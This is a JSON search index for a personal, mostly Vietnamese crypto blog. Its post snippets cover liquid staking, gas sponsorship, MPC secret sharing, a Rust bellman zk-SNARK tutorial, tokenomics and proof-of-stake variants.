[ { "title": "Why we need liquid staking?", "url": "/posts/what-is-liquid-staking/", "categories": "", "tags": "", "date": "2024-09-03 18:21:00 +0800", "snippet": "Heyyy, trong một ngày mưa gió, ngồi ở quán cafe ngắm đường phố, cũng rảnh rỗi nên viết bài chia sẽ 1 xíu với mọi người về Liquid Staking nhen. Topic liquid staking thực sự cũng không mới, chỉ cần lướt một vòng trên mạng là mọi người có thể hiểu được “sương sương” liquid staking là gì rồi. Nên trong post này, mình sẽ tiếp cận liquid staking với một hướng khác đi xíu, mình sẽ đi tìm hiểu thử đâu là vấn đề cơ bản hình thành nên giải pháp liquid staking, cũng như liquid staking sinh ra để làm gìTại sao cần liquid staking?Overview về Proof of stake, Đây là một cơ chế giúp cho các người dùng đang năm giữ Ether có thể lock số Ether của họ để bảo vệ network đồng thời tham gia quá trình xác thực block mới được tạo ra và nhận về block reward và transaction fee.Quá trình để một người tham gia vào việc staking được thể hiện trong hình sau:Có thể thấy rằng trong hình trên, khi bắt đầu deposit, stakers sẽ phải đợi từ 12-24 tiếng mới có thể bắt đầu earn được yield và khi bắt đầu request withdraw thì stakers cũng phải đợi từ 1-7 ngày mới hoàn toàn rút được số Ether đã khoá. Điều này là cần thiết để đảm bảo network có thể run một cách ổn định mà không bị sock khi có lượng deposit hoặc withdraw quá lớn.Từ đây sinh ra nhu cầu, có cách nào giúp những người muốn stake có thể bắt đầu earn yield ngay lập tức mà không cần phải đợi 12-24 tiếng ngoài ra có cách nào giúp những người đang stake có thể rút tiền của họ ngay lập tức mà không cần đợi 1-7 ngày ?Câu trả lời được các dự án Liquid Staking đưa ra là kết nối 2 tập người dùng này lại với nhau và cho phép họ trao đổi vị thế staking. Từ là người muốn stake sẽ mua lại vị thế stake của người khác bằng ETH của họ (việc này giúp họ có vị thế staking ngay lập tức mà không cần phải đợi 12-24 tiếng), người đang stake có thể bán vị thế của mình cho người khác và nhận về ETH (việc này giúp họ có thể rút tiền ngay lập tức mà không cần đợi 1-7 ngày).Làm thế nào để thực hiện việc này ?Các dự án liquid staking đã mapping vị thế staking của stakers thành 1 đồng ERC-20 token đại điện vì vậy các đồng ERC-20 đại diện này có thể được deposistors và withdrawers mua bán với nhau thông qua decentralized exchange như Uniswap.Khi có 1 user stake vào mạng Liquid staking protocol (LSP), LSP sẽ issue cho user đó 1 lượng token đại diện với lượng ether mà user đó gửi vào. Về rate trao đổi giữa ether user gửi vào và lượng token đại điện được issue ra sẽ tuỳ thuộc vào từng thời điểm, rate chênh lệch giữa Ether và token đại diện sẽ là lượng reward mà user nhận đượcMình sẽ lấy 1 ví dụ cụ thể: Tại thời điểm năm 2020: Mình stake vào LSP với tỷ giá trao đổi là 1:1 (tức 1 ether đổi được 1 token) Một năm sau (tức 2021): Mình muốn rút ether bằng việc bán lại token đại diện cho LSP và nhận lại Ether đã stake trước đó 1 năm. Lúc này tỷ giá sẽ thay đổi (giả định bỏ qua trượt giá do market condition và protocol fee) là 1:1.04 (Tức là với mỗi 1 token đại diện mình sẽ nhận về 1,04 ether, nếu trừ đi 1 ether stake ban đầu thì 0,04 ether chính là lượng yield mình nhận được sau 1 năm stake) Và cứ thế tiếp diễn… Exchange rate quy đổi giữa Token và Ether sẽ luôn tăng do lượng yield được sinh ra từ network.Như hình dưới đây là exchange rate của ETH với wstETH - token đại diện được Lido (dự án lớn nhất về Liquid staking trên Ethereum) issue ra, có thể thấy được rate này sẽ luôn luôn tăng do lượng yield được sinh ra trong hoạt động staking:Ngoài ra với việc có token đại diện cho các vị thế Staking, những người đang stake (nắm giữ token đại diện) có thể tham gia vào các hoạt động khác trong hệ sinh thái Defi để nhận thêm lợi nhuận…Ngoài ra thì còn 1 số problem đã được giải quyết như Staker có thể stake với số lượng Ether tuỳ ý mà không cần phải tuân theo quy định của network, các ý này được giải thích khá rõ ràng ở đây: What is liquid staking - by ChainlinkGood approachThực sự các dự án Liquid staking đã có cách giải quyết vấn đề khá tốt. Không những giải quyết được các nhu cầu cơ bản cho user cũng đồng thời mở ra được nhiều usecase mới khi người dùng tham gia stake. Giờ đây stake không chỉ là hoạt động bảo vệ network nhận reward mà còn trở thành một trong các lớp infra chính của nền Decentralize Finance." }, { "title": "How to send a sponsor transactions?", "url": "/posts/how-to-send-a-sponsor-transaction/", "categories": "", "tags": "", "date": "2024-08-19 14:51:30 +0800", "snippet": "GM GM mọi người, hôm nay mình cùng nhau đi tìm hiểu có cách nào để giải quyết vấn để sponsor transaction trên blockchain không?. Có cách nào để giúp trải nghiệm của người dùng mượt mà hơn ví dụ như user có thể swap USDC -&amp;gt; USDT mà không cần phải có thể ETH trong ví để trả fee gas cho transaction?.Tại sao cần sponsor transactions?Ở crypto, có 2 cái rào cản khá là lớn cho các users mới bắt đầu sử dụng ví blockchain, 1 là phải học cách bảo mật key (phần này mình sẽ để dành cho các bài sau), 2 là phải trả tiền fee cho các transaction trên mạng blockchain bằng đồng native của chain đó (ví dụ trên mạng Ethereum thì user sẽ cần phải mua ETH để trả phí, Binance Smart Chain thì phải mua BNB để trả phí) hôm nay mình đi sâu vào tìm giải pháp cho vấn để này có cách nào làm dapp trên blockchain mà khi user sử dụng họ sẽ không cần phải trả phí gas không ?Gas station solutionĐây là một giải pháp được phát triển bởi team Eth Gas Station, giải pháp của họ khá là hay cho phép các dự án sponsor transaction cho users một cách dễ dàng và bảo mật.Ý tưởng này có thể được giải thích đơn giản như sau: bên thứ ba (được gọi là forwarders) có thể gửi giao dịch của user khác và tự trả chi phí gas.Trong sơ đồ này, users ký các tin nhắn (không phải transaction) chứa thông tin về transaction mà họ muốn thực hiện. Sau đó, forwarders chịu trách nhiệm ký các transactions hợp lệ với thông tin này và gửi chúng đến blockchain network, thanh toán chi phí gas. Contracts sẽ xác minh danh tính của user ban đầu yêu cầu giao dịch. Bằng cách này, users có thể tương tác trực tiếp với các smart contracts mà không cần phải có ví hoặc sở hữu Ether.Nhược điểm của cách này thì DApp developers cần phải custom lại smart contracts của hệ thống mới có thể apply sponsor gas cho user. Các bạn xem một ví dụ về contract sử dụng Gas Station ở đây Openzeppelin - Gas StationMột số solution cho sponsor transaction khácNgoài Gas Station, cũng có một số bên thứ ba cố gắng solve problem này để mang tới trải nghiệm muợt mà nhất cho user: VRC25 on Viction: Đây là một tiêu chuẩn token trên Viction Network cho phép các dapp developers có thể sponsor gas cho mọi transaction của users khi tương tác với contracts. Tuy nhiên giống với Gas station thì các DApp developers phải custom lại contract của họ để có thể sponsor gas. Sui sponsored transaction: Đây là solution được trang web official của Sui Network đề cập. Sui đã custom lại network của họ để việc sponsor transaction dẽ dàng hơn Paymaster on ERC-4337: Đây là một giải pháp khá generic, cho phép sponsor gas cho mọi hành động của user trên blockchain, nhưng bù lại users bắt buộc phải xài ví account abstraction mới có thể được sponsor gas.Mong rằng trong tương lai, vấn đề về gas fee sẽ được các developers giải quyết mang tới trải nghiệm liền mạch cho user.Nếu có bất kỳ thắc mắc nào hãy discuss với mình ở đây @imduchuyyy." }, { "title": "Back To Blogging", "url": "/posts/back-to-blogging/", "categories": "", "tags": "", "date": "2024-08-14 12:00:30 +0800", "snippet": "GM GM, Đã hơn 8 tháng rồi mình không quay lại viết blog, đến mức mà domain nottheblog hết hạn luôn rồi =)). Check lại thì bài gần nhất đã từ tháng 12 2023. Thật ra là mình vẫn có viết, viết trên channel Telegram của mình: All Road Lead to Crypto. Cũng vẫn là mấy dòng linh tinh thôi à nhưng cũng khá là vui vì các bài viết trên này của mình tiếp cận được nhiều người, cũng có khá nhiều người nhắn tin cho mình để discuss về các topic mình đặt ra trong các bài viết ở đây:Mặc dù đã khá lâu không viết gì trên đây, nhưng thời gian qua thực sự mình đã thay đổi khá nhiều, kết bạn với nhiều bạn mới, học được nhiều cái mới hơn. Cũng có một số trải nghiệm khá là thú vị =)).Update 8 tháng vừa quaTrong 8 tháng vừa rồi mình đã có những trải nghiệm khá tuyệt vời, muốn chia sẻ với mọi người.Kết bạn với khá nhiều người mới qua các cộng đồng NFT8 tháng vừa rồi, mình cũng thử chuyển hướng đầu tư một phần vào NFT, tham gia vào các communities NFT, kết bạn với nhiều người trong đây, trải nghiệm văn hoá NFT… Thực sự khá là vui, nhờ NFT mình có thêm nhiều bạn bè, mối quan hệ mới.Abstraction WalletThời gian qua mình có làm research và khá là impressed với Account Abstraction Technology. Với mình, đây có thể là công nghệ thay đổi toàn cảnh ngành Web3 Wallet hiện tại. Để hiểu rõ hơn về điểm mạnh điểm yếu của stack này, mình có làm thử 1 cái PoC product, đây là trang giúp cho người dùng tạo ví web3 mà không cần backup seeds phrase hoặc có thể recover lại ví của mình bằng những cách thức giống với web2 (social recovery, backup wallet). Trang web này mình làm lấy ý tưởng từ sản phẩm Coinbase Smart Wallet.Mọi người có thể trải nghiệm flow on-boarding tại đây: Tạo ví, Mint NFTSource code của trang web này thì mình cũng public luôn, mọi người có thể xem ở đây: githubDomain mới chặng đường mớiCũng nhân dịp cái domain nottheblog.com hết hạn mình mua luôn domain mới luôn. Check it out at imduchuyyy’s home.Ngày xưa lúc mình viết nottheblog mình hướng đây là 1 blog về technology là chính + thêm việc mình muốn làm nó ẩn danh một tý, nên chọn cái domain cũng khá là lạc =)).Nay mình quyết định thay đổi định hướng một tý cho cái blog này, sẽ viết tiếng Việt nhiều hơn (do xưa cứ tập tành viết tiếng anh, đâm ra lười viết luôn .-.), ít viết các bài nặng về tech nhiều hơn thay vào đó là các bài viết về cuộc sống, đây sẽ là nơi mình ghi lại như một cuốn nhật ký vậy để 5-10 năm nữa đọc lại xem sao =)).Để mình research xem rồi host luôn cái trang web này sử dụng ENS luôn, ghi nhật ký bằng blockchain =)) Huy’s home is on the internet." }, { "title": "[Thinking] The world-changing power of start-ups", "url": "/posts/the-world-changing-power-of-startups/", "categories": "", "tags": "", "date": "2023-12-26 10:17:30 +0800", "snippet": " Startup is the way to help others to make their lifes so much easier. Many people are working at jobs, they don’t want to but they have to. Why we are doing the things that we don’t like. But we have to do because of money. Startup world is a big world. We are growing our business in a lot more creative way, that will help others and us.In today’s rapidly evolving world, the term “startup” has become increasingly popular. Startups are businesses founded by entrepreneurs who aim to develop unique products or services that solve problems or fulfill gaps in the market. These companies typically start with high uncertainty and face high rates of failure, but a minority of them go on to become successful and influential.What is startupA startup is a company or project undertaken by an entrepreneur to seek, develop, and validate a scalable business model. These businesses usually begin with one or more founders who have a way to solve a problem or create a new opportunity. Startups typically face high risks and challenges, but they can also offer unique opportunities for growth, innovation, and learning.The Impact of Startups on SocietyStartups have the potential to change the world by offering innovative solutions to pressing problems and creating new opportunities for growth. They can disrupt industries, challenge established ways of thinking and doing business, and provide society with something it needs but hasn’t created yet. As a result, startups are increasingly attractive to young entrepreneurs who want to make a difference and create history.Challenges and Opportunities in the Startup WorldDespite the potential benefits, startups also come with challenges and risks. High failure rates and uncertain outcomes make starting a startup a high-stakes endeavor. However, successful startups can offer immense rewards, including financial success, recognition, and the satisfaction of creating something meaningful.To overcome these challenges and capitalize on opportunities, startups must: Validate their business model: Founders need to conduct market research and gather feedback from potential customers to ensure there is a demand for their product or service. Develop a minimum viable product (MVP): Startups should create a prototype or initial version of their product or service to test and refine their business model. Attract funding: Startups often need to seek external funding from sources such as family and friends, venture capitalists, crowdfunding, or loans to finance their growth. Build a strong team: A powerful team with diverse skills and expertise is essential for the success of a startup.The world-changing power of start-upsStartups are more than just businesses – they’re about being brave and having lots of potential. They encourage big dreams, challenges that teach you things, and leaving a mark that lasts. Starting a business is like a rollercoaster – you learn from tough times, celebrate the good times, and add to a story of new ideasImagine waking up each day excited about what you could do, driven by a passion that guides your efforts. Startups give you a chance to be excited, where big ideas can really make a difference. It’s not just about making a product; it’s about making a future where what you love to do meets something important." }, { "title": "[Research] Explain MPC by basic math concepts", "url": "/posts/explain-mpc-by-math-concepts/", "categories": "", "tags": "", "date": "2023-08-28 10:17:30 +0800", "snippet": "Cryptocurrencies have revolutionized the world of finance, offering exciting opportunities for wealth management and transactions. However, security remains a paramount concern in the realm of digital assets. To address this, Multi-Party Computation (MPC) wallets have emerged as a cutting-edge solution, leveraging the power of basic math to enhance security while managing cryptocurrency funds.Understanding the Basics of MPC WalletsAt its core, an MPC wallet is a cryptographic innovation that enables multiple parties to collaboratively manage and transact with cryptocurrencies while maintaining the privacy of their individual inputs. Let’s delve into this concept using fundamental math principles.Imagine a scenario where Alice is new to cryptocurrency. She’s worried that if she forgets her private key, she could lose all of her crypto assets. She reaches out to her friends, and they’re willing to help her protect her key. Traditionally, Alice might share a single private key, which is a risky approach. However, with MPC wallets, she can embrace a concept known as “secret sharing.”Secret SharingAlice’s intention is simply to have her friends assist her in case she loses her private key. With MPC, Alice will “split her private key into N parts.” Let’s say Alice’s private key is S=65. She wants N=4 friends to help secure her funds, and ONLY if she receives at least K=2 (where K &amp;lt;= N) approvals, she can recover the key. Initially, in order to encrypt the secret code, Alice build a polynomial of degree (K – 1). Therefore, let the polynomial be y = a + bx. Here, the constant part ‘a’ is her private key (S) Let b be any random number, say b = 15. Therefore, for this polynomial y = 65 + 15x, she generates N points from it Let those 4 points be (1, 80), (2, 95), (3, 110), (4, 125). Clearly, she can generate the initial polynomial from any two of these 4 points and in the resulting polynomial, the constant term a is the required secret codeAlice sends each part of the key to her friends, and now she can use her wallet without the fear of losing her private key.Recover private key: The Art of MathematicsOne day, Alice discovers that she has lost her private key. She can reach out to at least 2 of her 4 friends to reconstruct her private key. The following equations illustrate how they can compute it:For example Alice collected 2 points (1, 80) and (3, 110) from her friend. She can employ Lagrange basis Polynomial to construct the private key, The Lagrange basic Polynomial say:Let reconstruct the private key with given 2 points: Now the private key is 65 Remember that, ONLY if Alice has the approval from at least K=2 friends, she can reconstruct the keyReal-World Applications and Beyond Basic MathIn real-world MPC wallets, advanced cryptographic protocols and algorithms are employed to ensure the highest levels of security. The use of sophisticated mathematical techniques safeguards transactions against various types of attacks, including collusion attacks and insider threats.MPC wallets also open the door to exciting possibilities, such as decentralized finance (DeFi) applications, where multiple parties can pool their assets for lending, borrowing, and yield farming while maintaining control over their private keys." }, { "title": "Tìm hiểu zk-SNARKs với rust!", "url": "/posts/zk-SNARKs/", "categories": "", "tags": "", "date": "2022-07-23 00:00:00 +0800", "snippet": "Zk-SNARKs là từ viết tắt của Zero-Knowledge Succinct Non-Interactive Argument of Knowledge. Zk-SNARK là một bằng chứng mật mã cho phép một bên chứng minh rằng họ sở hữu một số thông tin nhất định mà không tiết lộ thông tin đó.Bằng chứng này được thực hiện bằng cách sử dụng khóa bí mật được tạo trước khi giao dịch diễn ra. Nó được sử dụng như một phần của giao thức cho nhiều loại tiền điện tử như (ZCash) zk-SNARKs is Zero-Knowledge proof protocol used in encryption, and is and acronym that stands for “Zero-Knowledge Succinct Non-Interactive Argument of Knowledge”.Hiểu về zk-SNARKsZk-SNARKs phát triển dựa trên thuật toán gốc zero-knowledge proof:Zero-knowledge proof (zk) là một loại thuật toán cho phép một bên (the prover) chứng minh với bên khác (the verifier) rằng một tuyên bố là đúng, mà không tiết lộ bất kỳ thông tin nào vượt quá giá trị của tuyên bố đó. Ví dụ, với hàm băm của một số ngẫu nhiên, prover có thể thuyết phục verifier rằng thực sự tồn tại một số với giá trị băm này, mà không tiết lộ nó là gì.Mục tiêu của zero-knowledge proofs là để verifier có thể tự thuyết phục mình rằng prover sở hữu kiến thức về một tham số bí mật, được gọi là witness, đáp ứng một số mối quan hệ, mà không tiết lộ witness cho verifier hoặc bất kỳ ai khác.Trong từ viết tắt SNARK, succinct có nghĩa là những bằng chứng này có kích thước nhỏ hơn và có thể nhanh chóng được xác minh. Non-interactive có nghĩa là có rất ít hoặc không có sự tương tác giữa prover và verifier. Các phiên bản cũ hơn của zero-knowledge protocols thường yêu cầu prover và verifier giao tiếp qua lại và do đó, được coi là . Nhưng trong các cấu trúc non-interactive, prover và verifier chỉ phải trao đổi một bằng chứng. Chuyển sang phần Arguments of Knowledge của từ viết tắt. zk-SNARK được coi là hợp lý về mặt tính toán, có nghĩa là một prover không trung thực có rất ít khả năng gian lận thành công hệ thống mà không thực sự có dữ liệu về witness để hỗ trợ chứng minh của họ. Tính chất này được gọi là tính hợp lý và giả định rằng prover có khả năng tính toán hạn chế.Về mặt lý thuyết, một prover có đủ sức mạnh tính toán có thể tạo ra các bằng chứng giả, và đây là một trong những lý do khiến máy tính lượng tử được nhiều người coi là mối đe dọa đối với zk-SNARK (và các hệ thống blockchain).Chúng ta có thể nghĩ về điều này một cách cụ thể hơn là có một hàm, ký hiệu là C, lấy hai đầu vào: C (x, w). Đầu vào x là đầu vào công khai và w là đầu vào của witness. Đầu ra của chương trình là boolean, tức là true hoặc false. Mục tiêu sau đó được đưa ra một đầu vào công khai cụ thể x, chứng minh rằng prover biết witness w sao cho C (x, w) == true.Zero-knowledge proof có thể xác minh nhanh chóng và thường chiếm ít dữ liệu hơn nhiều so với một giao dịch Bitcoin tiêu chuẩn. Điều này mở ra một con đường cho công nghệ zk-SNARK được sử dụng như một giải pháp bảo mật và khả năng mở rộng.Trên thế giới hiện nay đã có rất nhiều implement của zk-SNARKs, các bạn có thể tìm hiểu qua: Spartan của ông lớn Microsoft Bellman …Cách thức hoạt động của zk-SNARKsZk-SNARKs bao gồm 3 thuật toán khác nhau: G, P and V G algorithm: G (Key generation) nhận vào input “lambda” (phải được giữ bí mật về input lambda) và chương trình C. Sau đó, G tiến hành tạo ra 2 public key, 1 khoá dành cho prover (pk) và một khoá dành cho verifier (vk). Các khoá này đều công khai cho tất cả các bên tham gia P algorithm: P dành cho prover nhận vào 3 tham số đầu vào: pk: khoá dành cho prover (generate bằng G) x: Tham số ngẫu nhiên public bởi các bên w: private statament prover muốn chứng minh họ biết nhưng không muốn tiết lộ w Thuật toán P tạo ra một bằng chứng prf = P(pk, x, w) V algorithm: V nhận vào 3 input và cơ bản trả về 1 trá trị boolean. vk: Khoá dành cho verifier (generate bằng G) x: Tham số tạo bởi P prf: Proof tạo bởi prover boolean a = V(vk, x, prf) Một biết boolean có 2 lựa chọn, TRUE có nghĩa là bằng chứng cho P tạo ra là đúng, FALSE là ngược lại.Về tham số lambda và chương trình C: Tham số Lambda phải được giữ bí mật vì bất kì ai có được tham số lambda đều có thể tạo ra prf giả mạo Về cơ bản, hàm C nhận 2 giá trị đầu vào, giá trị công khai x và tham số bí mật w, Thường x sẽ được chọn là giá trị hash của w, x = H(w) và hàm C được thiết kế như sau:def C(x, w): ... return sha256(w) == xExample với ngôn ngữ RustGiới thiệu về RustRust là ngôn ngữ lập trình được tạo ra vào năm 2006 bởi Graydon Hoare như một dự án phụ khi đang là developer tại Mozilla. Rust pha trộn hiệu suất của các ngôn ngữ như C ++ với cú pháp thân thiện hơn, tập trung vào code an toàn và được thiết kế tốt giúp đơn giản hóa việc phát triểnNói một cách đơn giản, mình thấy Rust là ngôn ngữ lập trình cấp thấp (low level), định kiểu tĩnh (statically typed), khá là đa dụng (multi-paradigm), phù hợp với các ứng dụng tập trung vào sự an toàn và hiệu suất.Giới thiệu về bellmanBellman là một thư viện phần mềm zk-SNARK được phát triển bởi nhóm Zcash bằng ngôn ngữ Rust, thực hiện thuật toán Groth16.Quy trình tổng thể của bellman:Quá trình tổng thể có thể được chia thành các bước sau: Flatten bài toán đa thức và xây dựng circuit tương ứng. Bước này được thực hiện bởi upper-level application Tạo R1CS (Rank 1 Constraint System) theo circuit ở bước 1 Chuyển đổi R1CS (Rank 1 Constraint System) sang QAP (Quadratic Arithmetic Program). Phương pháp truyền thống là sử dụng phép nội suy Lagrange, nhưng để giảm độ phức tạp tính toán, nó có thể được thực hiện bằng Fast Fourier Transform. Setup các tham chiếu của QAP, đó là CRS (Common Reference Strings) Tạo proof dựa trên CRS và input của prover Verifier verify proofLet Code With Terry =))Trong ví dụ lần này, mình sẽ demo một bài toán đơn giản: Lin và Terry biết một giá trị c và Lin muốn chứng minh với Terry “Lin biết 2 số một giá trị y sao cho hash(y) = c mà không làm lộ giá trị của y”Setup projectTạo projectmkdir bellman-examplecd bellman-exampleInit cargo projectcargo initAdd bellman dependencies vào file Cargo.tomlFile Cargo.toml sẽ trông giống như thế này:[package]authors = [&quot;Terry&quot;]name = &quot;bellman-example&quot;version = &quot;0.1.0&quot;edition = &quot;2021&quot;# See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html[dependencies]bellman = &quot;0.13.1&quot;Build thử và chạy projectcargo build &amp;amp;&amp;amp; ./target/debug/bellman-exampleChúng ta đã hoàn thành setup rust project đơn giản.Setup bài toánBellman cung cấp cho chúng ta Circuit trait, chúng tá có thể sử dụng nó để synthesize các ràng buộc của bài toán trên/// Implement sha256(hash) function. Input and output are in little-endian bit order.fn impl_sha256&amp;lt;Scalar: PrimeField, CS: ConstraintSystem&amp;lt;Scalar&amp;gt;&amp;gt; ( mut cs: CS, data: &amp;amp;[Boolean]) -&amp;gt; Result&amp;lt;Vec&amp;lt;Boolean&amp;gt;, SynthesisError&amp;gt; { let input: Vec&amp;lt;_&amp;gt; = data.chunks(8).map(|c| c.iter().rev()).flatten().cloned().collect(); let res = sha256(cs.namespace(|| &quot;SHA-256(input)&quot;), &amp;amp;input)?; Ok(res.chunks(8).map(|c| c.iter().rev()).flatten().cloned().collect())}struct OurProblem { value: Option&amp;lt;[u8; 80]&amp;gt;,}impl&amp;lt;Scalar: PrimeField&amp;gt; Circuit&amp;lt;Scalar&amp;gt; for OurProblem { fn synthesize&amp;lt;CS: ConstraintSystem&amp;lt;Scalar&amp;gt;&amp;gt;(self, cs: &amp;amp;mut CS) -&amp;gt; Result&amp;lt;(), SynthesisError&amp;gt; { }}Trong hàm synthesize, chúng ta define bài toán theo dạng Constraint programming và alloc giá trị vào các biến được define ở OurProblem structfn synthesize&amp;lt;CS: ConstraintSystem&amp;lt;Scalar&amp;gt;&amp;gt;(self, cs: &amp;amp;mut CS) -&amp;gt; Result&amp;lt;(), SynthesisError&amp;gt; { let bit_values = if let Some(value) = self.value { value.into_iter().map(|byte| (0..8).map(move |i| (byte &amp;gt;&amp;gt; i) &amp;amp; 1u8 == 1u8)).flatten().map(|b| Some(b)).collect() } else { vec![None; 80 * 8] }; let pre_bit = bit_values.into_iter().enumerate().map(|(i, b)| { AllocatedBit::alloc(cs.namespace(|| format!(&quot;Pre bit {}&quot;, i)), b) }).map(|b| b.map(Boolean::from)) .collect::&amp;lt;Result&amp;lt;Vec&amp;lt;_&amp;gt;, _&amp;gt;&amp;gt;()?; let hash = impl_sha256(cs.namespace(|| &quot;SHA-256(value)&quot;), &amp;amp;pre_bit)?; multipack::pack_into_inputs(cs.namespace(|| &quot;pack hash&quot;), &amp;amp;hash)}Tạo random keyTạo bộ pk và pvk, bộ key này sẽ được công khai và chia sẻ giữa Lin và Terry:let params = { let c = problem::OurProblem { value: None }; generate_random_parameters::&amp;lt;Bls12, _, _&amp;gt;(c, &amp;amp;mut OsRng).unwrap()};println!(&quot;Prepare key...&quot;);let pvk = prepare_verifying_key(&amp;amp;params.vk);Tạo proofsTạo proof với hidden input. Ở đây mình sẽ lấy ví dụ giá trị y của Lin là [40; 80]. Lin gửi inputs + proof cho Terry với tuyên bố Lin biết giá trị y sao cho hash(y) = xprintln!(&quot;Prepare input...&quot;);let hidden_value = [40; 80];let hash_bit = bytes_to_bits_le(&amp;amp;Sha256::digest(&amp;amp;hidden_value));let x = compute_multipacking::&amp;lt;Scalar&amp;gt;(&amp;amp;hash_bit);let c = problem::OurProblem { value: Some(hidden_value),};println!(&quot;Create proof...&quot;);let proof = create_random_proof(c, &amp;amp;params, &amp;amp;mut OsRng).unwrap();Verify proofTerry có thể verify tuyên bố của Lin là đúng ở bước Tạo proofs bằng cách tự xác thực proof mà không cần liên hệ với Lin đây là điểm non-interactive trong zk-SNARKs:println!(&quot;Verify proof...&quot;);let result = verify_proof(&amp;amp;pvk, &amp;amp;proof, &amp;amp;x);println!(&quot;Result: {}&quot;, result.is_ok());Verify proof...Result: trueToàn bộ source code của example mình sẽ để ở đây. Với bất kỳ thắc mắc các bạn có thể open issue ở repo, mình sẽ trả lời nếu mình biết :v.ConclusionNhư vậy qua bài viết cũng đã phần nào giới thiệu sơ lược về zk-SNARKs. Theo đánh giá cá nhân của mình, mình nghĩ zk-SNARKs là một công nghệ khá là thú vị và đáng học hỏi cho các bạn tìm hiểu về thuật toán mã hoá. Ứng dụng của nó cũng đã được chứng minh ở các dự án về blockchain lớn có thể kể tên như Tornado Cash, Z CashReferences Bellman example ZKP — Deep into Bellman Library What Is zk-SNARK?" }, { "title": "Everything About Tokenomics!", "url": "/posts/tokenomics/", "categories": "", "tags": "", "date": "2022-07-15 00:00:00 +0800", "snippet": " Tokenomics is the topic of understanding the supply and demand characteristics of cryptocurrencies.The structure of a cryptocurrency’s economy determines the incentives that encourage investors to buy and hold a specific coin or token. Just like how fiat currencies are all different, each cryptocurrency has its own monetary policy.Tokenomics determine two things about a crypto economy – the incentives that set out how the token will be distributed and the utility of the tokens that influence its demand. Supply and demand has a huge impact on price, and projects that get the incentives right can surge in value.Mining and StakingFor base layer blockchains, like Ethereum 1.0 and Bitcoin, mining is the core incentive for a decentralized network of computers to validate transactions. Here, new tokens are given to those who devote their computing power to discovering new blocks, filling them with data and adding them to the blockchain.Staking rewards those who fulfil a similar role but by locking away a number of coins in blockchain system instead - this is how blockchains like Binance Smart Chain operate, and it’s the model that Ethereum’s moving toward with its 2.0 upgrade.Token burnsSome blockchains or protocols “burn/” tokens – permanently remove them from circulation – to reduce the supply of coins in circulation. According to the laws of supply and demand, reducing a token’s supply should help to support its price as the remaining tokens in circulation become more scarce.When there is excessive cryptocurrency flowing in the market, the price of that token remains low as the demand never exceeds the supply. In such a scenario, burning a portion of the cryptocurrency acts as a ‘deflationary’ move. The scarcity of the token rises and triggers a price appreciation of the remaining tokens in circulation.Example for token burns: Proof-of-Burn (PoB): This consensus mechanism requires users to stake their coins to become network validators. However, the staked coins are sent to a dead wallet, after which, they can no longer be accessed or spent. The more coins you burn, the higher your chances of becoming a validator.Limited and unlimited suppliesTokenomics determines a token’s maximum supply. Bitcoin’s tokenomics, for instance, dictates that no more than 21 million coins can ever be mined, with the last coin expected to enter circulation around the year 2140. Ethereum, by contrast, has no maximum limit, although its issuance each year is capped.Let’s look at Ethereum as an example of a coin with an infinite supplyToday, there are over 120,000,000 ETH in circulation. Though its yearly supply is capped at 18,000,000, there is no end to how many ETH can be mined over time. While Ethereum does have monetary value and can be bought or sold like any other crypto, it isn’t just a store-of-value coin like Bitcoin, meaning its value doesn’t need to be finite. Ethereum has a vast and diverse blockchain on which any number of decentralized projects can be built. New tokens, NFTs, and DeFi services are being created on Ethereum’s blockchain every day, and it currently stands as the most popular blockchain out there. On this blockchain, ETH can be used to pay gas fees and other transactional fees, giving the coin value within the network.Game Theory in tokenomicsGame theory incentivizes token holders to behave in honest ways. Good actors are rewarded by this mechanism whilst bad actors will lose their stake in the network. This ensures the network stays secure.ExampleThe great team at Messari created the chart below, which demonstrates the wide-ranging distribution among leading blockchains.It is easy to see the stark difference in token allocation among the Public Blockchains, but only upon careful examination do these hidden factors emerge. For example, Ethereum and EOS are heavily skewed in favor of public investors, in comparison to Binance or Solana. Still, distribution alone only paints a vague picture.Solana tokenomicSolana is a balance of inflationary forces and deflationary forces.The largest source of inflation is staking rewards, which are paid out on a schedule that produces a pre-computed inflation rate. This started at 8% a couple of months ago and reduces a little bit every epoch (about 2 days 19 hours). The rate at 2021 is 7.78%.This inflation will hit its final rate of 1.5% in about 10 years from now.That is a pretty low terminal rate and it’s quite reasonable.However there are also deflationary forces at work. A percent of every transaction fee is burned. This is deflationary. With enough transactions per second, this burn could equal 1.5% per year which would then make Solana 0% inflation (assuming we’re talking far enough out that inflation had already reached its terminal 1.5%). The burn rate could even be more than 1.5% per year with many, many transactions, which would then make Solana long-term deflationary.Basically, the inflation schedule range on this page:https://docs.solana.com/implemented-proposals/ed_overview/ed_validation_client_economics/ed_vce_state_validation_protocol_based_rewardsThe network pays rewards from a portion of network inflation. The rewards per epoch are fixed and must be evenly divided among all staked nodes according to their relative stake weight (stake proportional) and participation. Staking yields are based on the current inflation rate, the total number of SOL staked, and individual validator uptime and commission. A validator’s commission fee is the percentage fee paid to validators from network inflation. Validator uptime is defined by a validator’s voting. One vote credit is earned for each successful validator vote and votes are tallied at the end of the epoch for reward calculation.Polkadot tokenomicPolkadot uses NPoS (Nominated Proof-of-Stake) as its consensus mechanism. The system encourages DOT holders to participate as nominators. Nominators may back up to 16 validators as trusted validator candidates. Both validators and nominators lock their tokens as collateral and receive staking rewards.The staking system pays out rewards essentially equally to all validators regardless of stake. Having more stake on a validator does not influence the amount of block rewards it receives. However, there is a probabilistic component to reward calculation, so rewards may not be exactly equal for all validators in a given era.Distribution of the rewards are pro-rata to all stakers after the validator’s commission is deducted. In this way, the network creates incentives for the nomination of lower-staked validators to create an equally-staked validator set.References What Is Tokenomics and Why Is It Important? Podcast: Game theory, tokenomics and more with Noah Healy Polkadot Staking" }, { "title": "Varieties of Proof of Stake!", "url": "/posts/varieties-of-proof-of-stake/", "categories": "", "tags": "", "date": "2022-07-14 00:00:00 +0800", "snippet": "Blockchains require a mechanism to achieve consensus to verify transactions and the state of the ledger. One mechanism for arriving at consensus is Proof-of-Stake (PoS).Proof-of-stake protocols are a class of consensus mechanisms for blockchains that work by selecting validators in proportion to their quantity of holdings in the associated cryptocurrency. This is done to avoid the computational cost of proof-of-work schemes.With proof-of-stake (POS), cryptocurrency owners validate block transactions based on the number of coins a validator stakesThere are several variations of Proof-of-Stake, each with its own solution to achieve effective, resource-efficient network governance.Proof of Stake (Ethereum)Proof-of-stake is a type of consensus mechanism used by blockchains to achieve distributed consensus. In proof-of-work, miners prove they have capital at risk by expending energy. In 